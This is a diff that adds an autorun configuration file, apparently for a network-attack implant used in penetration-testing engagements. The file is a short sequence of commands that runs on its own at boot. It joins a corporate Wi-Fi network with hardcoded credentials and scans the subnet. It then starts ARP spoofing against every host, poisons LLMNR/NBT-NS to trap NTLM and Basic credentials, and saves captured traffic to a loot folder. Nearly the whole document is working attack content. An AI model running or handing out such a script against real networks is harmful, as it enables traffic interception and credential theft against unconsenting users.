@@ -1,0 +1,22 @@
+# /autorun.txt - runs automatically about 3 seconds after boot.
+# Ctrl+C during that 3-second window cancels it and drops you at the prompt.
+# Lines starting with # and blank lines are ignored. Each line is one CLI
+# command, same as typing it at the prompt.
+
+# Join the target network. Change ssid/password for your engagement.
+wifi connect CorpWifi s3cretpass
+
+# Give the WiFi stack a moment to settle before scanning.
+delay 2000
+
+# Map the local subnet.
+arpscan
+
+# Start the ARP spoof relay against every host found (keeps victims online)
+# and poison LLMNR/NBT-NS + trap NTLM/Basic credentials at the same time.
+arpspoof on
+responder on
+
+# Capture Ethernet traffic (real IP/DNS, not just encrypted WiFi) while the
+# relay is up. Everything lands in /loot automatically.
+pcap start sweep
